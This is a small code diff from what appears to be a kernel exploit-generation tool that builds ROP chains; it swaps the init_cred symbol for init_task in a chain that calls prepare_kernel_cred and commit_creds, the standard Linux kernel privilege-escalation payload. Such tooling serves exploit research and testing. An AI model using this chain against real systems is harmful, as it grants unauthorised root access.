@@ -22,7 +22,7 @@ from kxdb_tool.data_model.serialization import *
 BIT_SIZE = 64
 PREPARE_KERNEL_CRED = "prepare_kernel_cred"
 COMMIT_CREDS = "commit_creds"
-INIT_CRED = "init_cred"
+INIT_TASK = "init_task"
 FIND_TASK_BY_VPID = "find_task_by_vpid"
 SWITCH_TASK_NAMESPACES = "switch_task_namespaces"
 PARSE_MOUNT_OPTIONS = "parse_mount_options"
@@ -394,7 +394,7 @@ class RopGeneratorAngrop:
         """
         items = [
             self._find_pop_one_reg("rdi"),
-            self._find_symbol(INIT_CRED),
+            self._find_symbol(INIT_TASK),
             self._find_symbol(PREPARE_KERNEL_CRED),
             self._mov_rdi_rax(),
             self._find_symbol(COMMIT_CREDS)
